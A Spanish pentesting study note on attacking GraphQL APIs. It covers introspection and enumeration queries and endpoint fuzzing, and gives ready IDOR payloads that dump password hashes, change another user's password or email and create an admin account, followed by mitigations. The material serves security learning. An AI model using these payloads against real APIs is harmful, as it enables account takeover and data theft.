
---
Tags: #graphql #introspection #mutations #idors #enumeracion #pentesting

---
## 📌 Definición de GraphQL

- **GraphQL** es un lenguaje de consulta para APIs creado por Facebook.
    
- Permite que el cliente defina **exactamente qué datos necesita**, en lugar de recibir respuestas predefinidas (como en REST).
    
- La API suele exponer un **endpoint único** (`/graphql`) al que se envían **queries** (lectura) y **mutations** (modificación).
    

---

## 🔍 Introspection en GraphQL

- **Introspection**: característica que permite consultar el **esquema de la API** para descubrir:
    
    - Tipos de datos disponibles.
        
    - Queries y Mutations soportadas.
        
    - Campos y relaciones entre objetos.
        

### ✅ Ejemplo de introspection query:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

```

o en 1 sola linea:

`{__schema {types {name fields {name type {name kind}}}}}`

O en una sola linea:

`{ __schema { types { name fields { name type { name kind } } } } }
`

---

## 🗂 Métodos de Detección

|Método|Descripción|Ejemplo|
|---|---|---|
|**Fuzzing de endpoints**|Buscar rutas `/graphql`, `/api/graphql`, `/graphiql`.|`wfuzz -u https://target/FUZZ -w graphql.txt`|
|**Error-based**|Mensajes de error con `GraphQLError`.|`"Cannot query field"`|
|**Introspection**|Probar si `__schema` está habilitado.|Query introspection|
|**GraphiQL UI**|Consola interactiva expuesta por error.|`https://target/graphql?query={__schema{types{name}}}`|

---

## 📊 Enumeración de GraphQL

Una vez habilitada la introspection, podemos:

### 1. Listar tipos:

`{  __schema {types {name}}}`

### 2. Listar queries disponibles:

`{__schema {queryType {fields {name args {name type {name}}}}}}`

### 3. Listar mutations disponibles:

`{__schema {mutationType {fields {name args {name type {name}}}}}}`

---

## ✏️ Mutations en GraphQL

- **Mutations** permiten modificar datos (crear, actualizar, eliminar).
    
- Funcionan como “consultas con efectos secundarios”.
    

### Ejemplo de Mutation – Registro de usuario

`mutation {   createUser(input: { username: "test", password: "1234" }) {     id     username   } }`

### Ejemplo – Cambio de contraseña

`mutation {   changePassword(userId: 1, newPassword: "Pwned123") {     success   } }`

👉 Si no hay **controles de autorización adecuados**, aquí aparecen **IDORs**.

---

## 🎯 IDORs en GraphQL

- **Insecure Direct Object Reference (IDOR)** en GraphQL ocurre cuando un usuario puede **consultar o modificar datos ajenos** cambiando directamente un **ID** o parámetro.
    

### Ejemplo de IDOR en Query

`{   user(id: 2) {     id     email     passwordHash   } }`

👉 Si cualquier usuario puede cambiar `id: 2` y acceder a info de otros usuarios, es vulnerable.

### Ejemplo de IDOR en Mutation

`mutation {   updateUser(id: 2, email: "attacker@evil.com") {     id     email   } }`

👉 Si no hay validación, un atacante podría modificar datos de otras cuentas.

---

## 🧪 Ejemplos de Explotación

### 🔎 Enumeración de usuarios

`{   users {     id     username     email   } }`

### 🔐 Exfiltración de contraseñas (si están expuestas en esquema)

`{   users {     id     email     passwordHash   } }`

### 💣 Crear un admin (si existe mutation vulnerable)

`mutation {   createUser(input: { username: "admin2", password: "1234", role: "admin" }) {     id     username     role   } }`

---

## 🛡 Detección y Explotación con Herramientas

|Herramienta|Uso|
|---|---|
|**GraphQL Voyager**|Visualiza esquemas a partir de introspection.|
|**InQL (Burp Plugin)**|Automatiza la enumeración de GraphQL.|
|**GraphQLmap**|SQLmap pero para GraphQL (enumera y explota).|
|**Altair / Insomnia**|Testeo manual de queries y mutations.|

---

## 📌 Cómo Detectar y Explotar sin Código Fuente

1. Buscar endpoint `/graphql`.
    
2. Lanzar introspection query (`__schema`).
    
3. Extraer tipos y operaciones (`users`, `createUser`, `updateUser`).
    
4. Buscar campos como `id`, `email`, `password`.
    
5. Probar consultas cambiando IDs (IDORs).
    
6. Probar mutations alterando datos sensibles.
    

---

## ✅ Recomendaciones de Mitigación

- Deshabilitar **introspection en producción**.
    
- Aplicar **controles de autorización estrictos** en queries y mutations.
    
- Limitar campos expuestos (no incluir `passwordHash`).
    
- Implementar **rate limiting** en queries pesadas.
    

---

